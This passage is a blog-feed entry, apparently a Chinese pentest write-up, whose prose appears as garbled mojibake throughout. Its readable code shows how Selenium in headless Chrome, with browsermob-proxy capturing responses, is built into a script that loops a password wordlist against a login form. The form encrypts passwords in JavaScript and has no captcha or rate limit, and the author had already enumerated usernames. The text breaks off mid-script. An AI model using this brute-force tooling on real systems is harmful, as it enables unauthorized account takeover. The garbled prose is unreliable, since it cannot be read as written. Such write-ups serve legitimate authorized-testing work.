        <content type="html"><![CDATA[<h3 id="å‰å› ï¼š"><a href="#å‰å› ï¼š" class="headerlink" title="å‰å› ï¼š"></a>å‰å› ï¼š</h3><p>å…¶å®è¿™æ–‡è®²å¾—é‡ç‚¹ä¸æ˜¯å·¥å…·çš„å¼€å‘ï¼Œè€Œæ˜¯ä¸€ç§æ€æƒ³ï¼š</p><blockquote><p>å®Œå…¨å¯ä»¥åˆ©ç”¨ä¸€äº›å¯è‡ªåŠ¨åŒ–æµ‹è¯•æ¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œæ¸—é€æµ‹è¯•ä»»åŠ¡</p></blockquote><p>ä¸ºä»€ä¹ˆä¼šæƒ³åˆ°å†™è¿™ä¸ªè„šæœ¬ï¼Ÿçˆ±æ¨æƒ…ä»‡åŠ çº ç¼ </p><p>åœ¨æˆ‘çš„æ½œæ„è¯†é‡Œï¼Œæˆ‘åªä¼šåœ¨çœŸæ­£ç”¨çš„æ—¶å€™æ‰ä¼šå»æ‰¾è½®å­ï¼Œé€ è½®å­ï¼Œæ‰€ä»¥è¿™æ¬¡çš„è„šæœ¬ä¹Ÿæ˜¯å› ä¸ºä¸€æ¬¡å®é™…çš„å¸¸è§„æµ‹è¯•å¼•å‘çš„ä¸€è¿ä¸²è¿é”ååº”ï¼Œæˆ‘ç§°ä¹‹ä¸ºé“ç´¢è¿ç¯ï¼</p><p>åœ¨ä¸€æ¬¡æˆæƒçš„ç³»ç»Ÿæµ‹è¯•ä¸­ï¼Œæˆ‘å‘ç°äº†ç³»ç»Ÿæ‰¾å›å¯†ç åŠŸèƒ½å¤„æœ‰ä¸ªå¾ˆæœ‰è¶£çš„äº‹æƒ…ï¼Œæ‰¾å›å¯†ç è¿›è¡ŒéªŒè¯çš„æ—¶å€™ï¼Œéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œç›¸åº”ç»‘å®šçš„é‚®ç®±ï¼Œå½“æˆ‘è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åæ—¶å€™ï¼Œç³»ç»Ÿä¼šæç¤ºâ€œç”¨æˆ·åæˆ–é‚®ç®±é”™è¯¯â€</p><p>æ²¡æ¯›ç—…ï¼Œæ¨¡ç³Šä¿¡æ¯è¿”å›ï¼Œä½†æ˜¯å½“æˆ‘è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œé”™è¯¯çš„é‚®ç®±æ—¶ï¼Œç³»ç»Ÿä¼šæç¤ºâ€œè¾“å…¥é‚®ç®±é”™è¯¯â€ï¼Œç›¸ä¿¡å„ä½å¤§ä½¬éƒ½çŸ¥é“äº†ï¼Œè¿™é‡ŒæŒ–æ˜åˆ°ä¸€æšç”¨æˆ·åæšä¸¾çš„æ¼æ´ï¼Œé€šè¿‡ç³»ç»Ÿçš„æç¤ºç³»ç»Ÿï¼Œæ‰¹é‡çˆ†ç ´ç³»ç»Ÿå­˜åœ¨çš„ç”¨æˆ·åã€‚</p><p>ä½†æ˜¯ï¼Œäº¤è¿‡æ´çš„å¤§ä½¬ä»¬éƒ½çŸ¥é“ï¼Œé™¤éæ˜¯é‡‘èè¡Œä¸šï¼Œæˆ–è€…å…¶ä»–å¾ˆé‡è¦ç³»ç»Ÿï¼Œä¸€èˆ¬æ˜¯ä¸ä¼šæ”¶è¿™æ ·çš„æ¼æ´ï¼Œæ”¶ä¹Ÿæ˜¯ä½ä½ï¼ˆè¶…ä½çš„å“Ÿï¼‰ï¼Œæ°å·§æˆ‘åšçš„è¿™ä¸ªé¡¹ç›®ï¼Œä¸æ˜¯é‚£ä¸€ç±»ï¼Œæ‰€ä»¥æ²¡å•¥åµç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/912996750.png"></p><p>ä½†æ˜¯ä½†æ˜¯ï¼è¿™ä¸åƒæˆ‘ä»¬ä¸æ›²ä¸æŠ˜çš„å®‰å…¨äººå‘˜ï¼æ¯•ç«Ÿå›½å†…çš„é¥­ä¸å¤ªå¥½è¦æ˜¯å§ï¼ˆç©ç¬‘è¯ï¼‰ã€‚</p><h3 id="å·®ç‚¹åŠé€€"><a href="#å·®ç‚¹åŠé€€" class="headerlink" title="å·®ç‚¹åŠé€€"></a>å·®ç‚¹åŠé€€</h3><p>æ‰€ä»¥æˆ‘å†³å®šæç‚¹äº‹æƒ…ï¼ŒæŠŠè¿™ä¸ªæ´å±å®³åŠ å¤§ï¼Œæˆ‘ç¬¬ä¸€ä¸ªæƒ³çš„å°±æ˜¯çˆ†ç ´å›ºå®šçš„ç”¨æˆ·åä¸å¯†ç ï¼Œå› ä¸ºç³»ç»Ÿçš„ç™»å½•é¡µé¢ï¼Œæ— è®ºæ˜¯ä½ ç”¨æˆ·åé”™è¯¯è¿˜æ˜¯å¯†ç é”™è¯¯ï¼Œéƒ½è¿”å›â€œç”¨æˆ·åå’Œå¯†ç æˆ–é”™è¯¯ï¼â€ï¼Œä¸”æ²¡æœ‰éªŒè¯ç éªŒè¯ï¼Œä¹Ÿä¸é™åˆ¶æ¬¡æ•°ï¼Œåˆå› ä¸ºæˆ‘ä»¬æšä¸¾äº†æ­£ç¡®çš„ç”¨æˆ·åï¼Œè¿™ä¸ªæç¤ºç›¸å½“äºå˜æˆäº†â€œå¯†ç é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥â€ï¼Œå°±å¯ä»¥çˆ†ç ´å›ºå®šç”¨æˆ·åçš„å¯†ç äº†ï¼Œburpå¯åŠ¨ï¼Œç›´æ¥å°±å†²äº†!</p><p>çœ‹åˆ°å¯†ç åé¢æœ‰%3D%3Dï¼Œæˆ‘é€æ¸å…´å¥‹ï¼Œè¿™ä¸å°±æ˜¯base64åŠ å¯†å—ï¼Ÿç›´æ¥pythonè„šæœ¬ï¼Œå…ˆbase64åŠ å¯†ï¼Œç„¶åçˆ†ç ´ï¼Œèˆ’æœï¼Œç­‰ç€å‡ºå¯†ç å°±è¡Œäº†ï¼</p><p>ä½†æ˜¯å¾—å…ˆéªŒè¯æ˜¯å¦æ˜¯base64åŠ å¯†ï¼Œç„¶åæ”¾å…¥burpè§£ç ï¼Œæˆ‘æ“¦ï¼Œè§£ä¸å‡ºæ¥ï¼Œæˆ‘åˆšå¼€å§‹è¿˜ä¸ç›¸ä¿¡ï¼Œå¤šè¯•äº†å‡ æ¬¡ï¼Œè¿˜çœŸä¸æ˜¯ï¼</p><p>æ²¡äº‹æ²¡äº‹ï¼Œå†·é™å†·é™ï¼è¿™ç©æ„å¯†ç å­¦å˜›ï¼Œè¿™ä¸æœ‰æ‰‹å°±èƒ½æŠŠä»–çš„åŠ å¯†é€»è¾‘ç»™é€†å‡ºæ¥ï¼Œå“å‘€ï¼Œæˆ‘æ“¦ï¼Œæˆ‘çš„æ‰‹å‹’ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/752137079.png"></p><p>ç„¶åæ‰“å¼€jsï¼Œè¿›è¡Œæºç åˆ†æï¼Œæ¼‚äº®ï¼Œä¸€ä¸ªæ··æ·†æŠŠæˆ‘æ€è·¯ç»•åŸäº†é’¢ä¸çƒï¼<br>ç›´æ¥ç»™æˆ‘æ•´åŠé€€ï¼Œå†è§é¡¹ç›®ï¼Œå†è§ç½‘å®‰ï¼Œå†è§æ‰“å·¥äººï¼Œå›å®¶ç§ç”°å»äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3594481489.png"></p><h3 id="å¤©é©¬è¡Œç©º"><a href="#å¤©é©¬è¡Œç©º" class="headerlink" title="å¤©é©¬è¡Œç©º"></a>å¤©é©¬è¡Œç©º</h3><p>ä½†æ˜¯å§ï¼Œæˆ‘è§‰å¾—éš¾ä¸å€’æˆ‘ï¼Œæˆ‘è¿˜å¯ä»¥æŠ¢æ•‘ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¥å‰çœ‹è¿‡å¤§ä½¬ï¼Œé€šè¿‡æœ¬åœ°å»ºç«‹æœåŠ¡ï¼Œå»è°ƒç”¨ç³»ç»Ÿçš„jsï¼Œç„¶åä¸ºå·±ç”¨ï¼Œä½†æ˜¯ä¹Ÿå¾—æ‰¾åˆ°åŠ å¯†å‡½æ•°çš„æ¥å£ï¼Œbpä¸Šé¢å°±æœ‰æ’ä»¶ï¼Œæœ¬åœ°èµ·æœåŠ¡ï¼Œä½†æ˜¯ä¹Ÿå¾—æ‰¾åˆ°åŠ å¯†çš„å…¥å£å‡½æ•°ï¼è¿˜æ˜¯ä½©æœé‚£äº›å‰ç«¯è°ƒè¯•ç¡¬åˆšçš„å¤§ä½¬ï¼ŒçœŸæ˜¯å¤§ä½¬ï¼</p><p>å› ä¸ºæˆ‘ä»¥å‰è§è¿‡å›½å¤–çš„æŸæ€§èƒ½æµ‹è¯•è½¯ä»¶ï¼Œä¸çŸ¥é“å•¥åå­—äº†ï¼Œåæ­£æŒºè´µçš„ï¼Œèƒ½è‡ªåŠ¨æ§åˆ¶æµè§ˆå™¨è¿›è¡Œæ€§èƒ½è®¾ç½®ï¼Œå°±å¥½æ¯”ä¸€ä¸ªæœºå™¨äººå¸®ä½ è¾“å…¥ï¼Œå¸®ä½ æäº¤ï¼Œå¸®ä½ è®¿é—®ç½‘ç«™ï¼Œæˆ‘è§‰å¾—é…·æ­»äº†ï¼Œç„¶åæˆ‘å°±æƒ³äº†æƒ³å’‹å®ç°çš„ï¼Œæƒ³èµ·è‡ªåŠ¨åŒ–ï¼Œæˆ‘è‚¯å®šç¬¬ä¸€æ—¶é—´æƒ³èµ·äº†pythonï¼ŒGoogleä¸€æœè¿˜çœŸæœ‰ï¼</p><p>æœ‰äº‹æ‰¾ç™¾åº¦ï¼Œgoogleå‡†æ²¡é”™ï¼</p><h3 id="å¼€å§‹å¥‡å¹»ä¹‹æ—…"><a href="#å¼€å§‹å¥‡å¹»ä¹‹æ—…" class="headerlink" title="å¼€å§‹å¥‡å¹»ä¹‹æ—…"></a>å¼€å§‹å¥‡å¹»ä¹‹æ—…</h3><p>ä¸ºä»€ä¹ˆè¯´å¥‡å¹»å‹’?å› ä¸ºçˆ¬å‘çš„æ•…äº‹çœŸçš„ä¸€æŠŠé¼»æ¶•ä¸€æŠŠæ³ªçš„ï¼Œåˆ«è¯´äº†ï¼Œå“­æ™•åœ¨å•æ‰€ã€‚</p><p>å¼€å§‹ä½¿ç”¨seleniumæ¡†æ¶ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>Selenium æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯ï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ã€‚</p><p>å®ƒæ”¯æŒå„ç§æµè§ˆå™¨ï¼ŒåŒ…æ‹¬ Chromeï¼ŒSafariï¼ŒFirefox ç­‰ä¸»æµç•Œé¢å¼æµè§ˆå™¨ï¼Œå¦‚æœä½ åœ¨è¿™äº›æµè§ˆå™¨é‡Œé¢å®‰è£…ä¸€ä¸ª Selenium çš„æ’ä»¶ï¼Œé‚£ä¹ˆä¾¿å¯ä»¥æ–¹ä¾¿åœ°å®ç° Web ç•Œé¢çš„æµ‹è¯•ã€‚æ¢å¥è¯è¯´å« Selenium æ”¯æŒè¿™äº›æµè§ˆå™¨é©±åŠ¨ã€‚</p><p>è¿™é‡Œç”¨çš„ä¸œè¥¿python+selenium+browsermobproxy</p><h3 id="çˆ±-ä¹‹-åˆ-æ­¥-ä½“-éªŒ"><a href="#çˆ±-ä¹‹-åˆ-æ­¥-ä½“-éªŒ" class="headerlink" title="çˆ± ä¹‹ åˆ æ­¥ ä½“ éªŒ"></a>çˆ± ä¹‹ åˆ æ­¥ ä½“ éªŒ</h3><p>æˆ‘ä»¬å…ˆæ¥ä¸€ä¸ªå°ä¾‹å­æ„Ÿå—ä¸€ä¸‹ Seleniumï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ Chrome æµè§ˆå™¨æ¥æµ‹è¯•ï¼ˆå½“ç„¶ä½ å¯ä»¥iç¼“å­˜å…¶ä»–çš„æµè§ˆå™¨ä¸å½±å“ï¼‰ã€‚<br>æ³¨æ„åœ¨å°è¯•è¿™æ®µä»£ç ä¹‹å‰ï¼Œä½ å¾—å®‰è£…chromeæµè§ˆå™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">browser &#x3D; webdriver.Chrome()</span><br><span class="line">browser.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¿™æ®µä»£ç ï¼Œå®ƒä¼šè‡ªåŠ¨æ‰“å¼€chromeæµè§ˆå™¨ï¼Œç„¶åæ‰“å¼€<a href="http://www.baidu.com/%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%EF%BC%8C%E5%AE%8C%E5%85%A8%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BD%A0%E4%BC%9A%E7%9C%8B%E5%88%B0%E4%BD%A0%E7%9A%84chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E8%BF%99%E4%B8%AA%E8%BF%87%E7%A8%8B%E3%80%82">http://www.baidu.com/è¿™ä¸ªç½‘é¡µï¼Œå®Œå…¨å¯è§†åŒ–ï¼Œå› ä¸ºä½ ä¼šçœ‹åˆ°ä½ çš„chromeæµè§ˆå™¨æ‰“å¼€æµè§ˆè¿™ä¸ªè¿‡ç¨‹ã€‚</a></p><blockquote><p>å¦‚æœä»£ç æ‰§è¡Œé”™è¯¯ï¼Œæµè§ˆå™¨æ²¡æœ‰æ‰“å¼€ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯æ²¡æœ‰è£… Chrome æµè§ˆå™¨æˆ–è€… Chrome é©±åŠ¨æ²¡æœ‰é…ç½®åœ¨ç¯å¢ƒå˜é‡é‡Œã€‚ä¸‹è½½é©±åŠ¨ï¼Œç„¶åå°†é©±åŠ¨æ–‡ä»¶è·¯å¾„é…ç½®åœ¨ç¯å¢ƒå˜é‡å³å¯</p></blockquote><p>ä½†æ˜¯å› ä¸ºæˆ‘ä»¬çš„æµ‹è¯•éœ€è¦æäº¤çˆ†ç ´çš„ç”¨æˆ·åå’Œå¯†ç æ‰“å¼€ç½‘é¡µæ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œæ‰€ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;http:&#x2F;&#x2F;www.python.org&quot;)</span><br><span class="line">assert &quot;Python&quot; in driver.title#ç­‰å¾…åŠ è½½ç»“æŸ</span><br><span class="line">elem &#x3D; driver.find_element_by_name(&quot;q&quot;)</span><br><span class="line">elem.send_keys(&quot;pycon&quot;)</span><br><span class="line">elem.send_keys(Keys.RETURN)</span><br><span class="line">printï¼ˆdriver.page_sourceï¼‰</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¼šéå†æ‰“å¼€<a href="http://www.python.orgè¿™ä¸ªç½‘é¡µ/">http://www.python.orgè¿™ä¸ªç½‘é¡µ</a>ï¼Œç­‰Pythonå­—ä½“åŠ è½½å‡ºæ¥çš„æ—¶å€™ï¼Œæ‰éå†html æ ‘çŠ¶ç»“æ„ï¼Œæ‰¾åˆ°nameä¸ºqçš„æ ‡ç­¾ï¼Œç„¶åå¡«å…¥pyconï¼Œç„¶åæ¨¡æ‹Ÿç‚¹å‡»</p><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç­‰å¾…åŠ è½½ï¼Œå› ä¸ºå¯èƒ½ç½‘ç«™æœ‰jqä»€ä¹ˆçš„åŠ è½½æ²¡å®Œå…¨ï¼Œå†ç‚¹å‡»ä¼šå¤±å»åŸæ¥çš„éŸµå‘³ã€‚</p><p>æ ¹æ®å®é™…éœ€æ±‚çš„æƒ…å†µéœ€è¦è¿™æ®µä»£ç è¢«æˆ‘æ”¹æˆäº†è¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#æ‰¾åˆ°è¾“å…¥ç”¨æˆ·åçš„æ ‡ç­¾ï¼ŒæŠŠç”¨æˆ·åè¾“å…¥è¿›å»</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##æ‰¾åˆ°è¾“å…¥å¯†ç çš„æ ‡ç­¾ï¼ŒæŠŠç”¨æˆ·åè¾“å…¥è¿›å»</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#æ‰¾åˆ°ç™»å½•æ ‡ç­¾ï¼Œç„¶åç‚¹å‡»</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ¨¡æ‹Ÿäº†ä¸€æ¬¡å®Œæ•´çš„ç”¨æˆ·åå’Œå¯†ç è¾“å…¥ï¼Œä»¥åŠç‚¹å‡»ç™»å½•çš„æ•ˆæœ.</p><blockquote><p>å‘ç‚¹1<br>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨css_selectorï¼Œæœ¬æ¥å¯ä»¥ç›´æ¥ä½¿ç”¨by_class_nameçš„ï¼Œä½†æ˜¯å› ä¸ºæˆ‘å®é™…åˆ©ç”¨åœºæ™¯è¿™é‡Œå¾ˆç‰¹æ®Šï¼Œclassçš„åå­—ä¹‹é—´æœ‰ç©ºæ ¼ï¼Œä½¿ç”¨by_class_nameè·å–ä¸åˆ°ï¼Œå¦‚æœclassçš„åå­—æ²¡æœ‰ç©ºæ ¼ï¼Œå°±å¯ä»¥ç›´æ¥è·å–ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æ ‡ç­¾çš„å…¶ä»–çš„å±æ€§è®¿é—®åˆ°.</p></blockquote><p>ä½†æ˜¯è¿™æ ·åªèƒ½æäº¤ä¸€æ¬¡ç™»å½•è¯·æ±‚ï¼Œè€Œä¸”è¿˜å¾—å¿…é¡»æ¸…ç©ºä¸Šä¸€æ¬¡å¡«å†™çš„è´¦å·å¯†ç ï¼Œå†æ”¹è¿›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;xxxxxxxx&quot;)</span><br><span class="line">#å¾ªç¯åŠ åœ¨è¿™</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)#æ‰¾åˆ°è¾“å…¥ç”¨æˆ·åçš„æ ‡ç­¾ï¼ŒæŠŠç”¨æˆ·åè¾“å…¥è¿›å»</span><br><span class="line">driver.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)##æ‰¾åˆ°è¾“å…¥å¯†ç çš„æ ‡ç­¾ï¼ŒæŠŠç”¨æˆ·åè¾“å…¥è¿›å»</span><br><span class="line">driver.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()#æ‰¾åˆ°ç™»å½•æ ‡ç­¾ï¼Œç„¶åç‚¹å‡»</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">driver.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br></pre></td></tr></table></figure><p>å†æ­¤åŸºç¡€ä¸ŠåŠ ä¸ªå¾ªç¯ï¼Œå¯ä»¥æ‰¹é‡çˆ†ç ´ä»–çš„å¯†ç äº†ï¼Œå› ä¸ºchromeæµè§ˆå™¨å·²ç»è‡ªåŠ¨åŠ è½½è°ƒç”¨jså¸®æˆ‘ä»¬åŠ å¯†å¥½äº†å˜æˆäº†å¯†æ–‡ï¼Œç„¶åå†å‘é€è¿‡å»ï¼ŒçœŸæ˜¯niceé¸­ï¼</p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜,å°±æ˜¯æˆ‘æ— æ³•æ•è·æœåŠ¡å™¨çš„è¿”å›åŒ…,åˆšå¼€å§‹ä½¿ç”¨seleniumæŠ“å–chromedriverçš„network</p><blockquote><p>æŠ“åˆ°çš„æµé‡è¿˜å¾—è‡ªå·±åˆ†æ,å°±å¾ˆéš¾å—,ç„¶åå°±æ˜¯ä½¿ç”¨äº†browsermobproxy æ¥å¼€å¯ä¸€ä¸ªä¸­é—´çš„ä»£ç†,è®©æˆ‘çš„chromeå…ˆå»ç»è¿‡browermobproxy,ç„¶åbrowermobproxyæŠ“å–æˆ‘çš„httpæµé‡,å°±å¯ä»¥æ‹¿åˆ°äº†æœåŠ¡å™¨è¿”å›åŒ…äº†.å°±å¾ˆnice!</p></blockquote><p>Browsermob-Proxyæ˜¯ä¸€ä¸ªå¼€æºçš„Javaç¼–å†™çš„åŸºäºLittleProxyçš„ä»£ç†æœåŠ¡ã€‚Browsermob-Proxyçš„å…·ä½“æµç¨‹æœ‰ç‚¹ç±»ä¼¼ä¸Flidderæˆ–Charlesã€‚å³å¼€å¯ä¸€ä¸ªç«¯å£å¹¶ä½œä¸ºä¸€ä¸ªæ ‡å‡†ä»£ç†å­˜åœ¨ï¼Œå½“HTTPå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ç­‰ï¼‰è®¾ç½®äº†è¿™ä¸ªä»£ç†ï¼Œåˆ™å¯ä»¥æŠ“å–æ‰€æœ‰çš„è¯·æ±‚ç»†èŠ‚å¹¶è·å–è¿”å›å†…å®¹ã€‚<br>å®‰è£…:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åˆ°é¡¹ç›®çš„githubä¸Šä¸‹è½½æ‰“å¥½çš„å‹ç¼©åŒ…å³å¯:https:&#x2F;&#x2F;github.com&#x2F;lightbody&#x2F;browsermob-proxy&#x2F;releasesï¼Œæ”¯æŒLinuxå’ŒWindowsã€‚</span><br><span class="line"></span><br><span class="line">å®‰è£…å¯¹åº”çš„pythonåŒ…:</span><br><span class="line"></span><br><span class="line">pip install browsermob-proxy</span><br><span class="line">ä¸‹è½½å¥½browsermob-proxyä¹‹åï¼Œæ”¾åœ¨æŒ‡å®šä¸€ä¸ªç›®å½•ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œæ˜¯ D:\apk\browsermob-proxy-2.1.4-bin\browsermob-proxy-2.1.4è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œæ‰€ä»¥ä¸‹é¢ç¤ºä¾‹ä»£ç å¦‚ï¼š</span><br><span class="line"></span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">server &#x3D; Server(&quot;è·¯å¾„&quot;)</span><br><span class="line">server.start()</span><br><span class="line">proxy &#x3D; server.create_proxy()</span><br></pre></td></tr></table></figure><p>é…ç½®Proxyå¯åŠ¨WebDriver:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line"></span><br><span class="line">chrome_options &#x3D; Options()</span><br><span class="line">chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(proxy.proxy))</span><br><span class="line">driver &#x3D; webdriver.Chrome(chrome_options&#x3D;chrome_options)</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯:</p><blockquote><p>browsermob-proxyèµ·çš„Serveré»˜è®¤æ˜¯8080ç«¯å£</p></blockquote><p>å¯ä»¥ç›´æ¥è¿›å…¥åˆ°Serverè¿™ä¸ªç±»é‡Œé¢å»ä¿®æ”¹ä»–çš„ç›‘å¬ç«¯å£<br>ç›´æ¥ä¸Šæ ¹æ®å®é™…æµ‹è¯•éœ€æ±‚æœ€ç»ˆä»£ç :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxyæ–‡ä»¶çš„ä½ç½®</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#è¿™é‡ŒåŠ äº†ä¸€ä¸ªå‚æ•°,ä¸å¯åŠ¨chromeæµè§ˆå™¨,çœå»äº†å¯åŠ¨çš„æ—¶é—´,æ›´å¿«äº†</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;ht_list2&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span 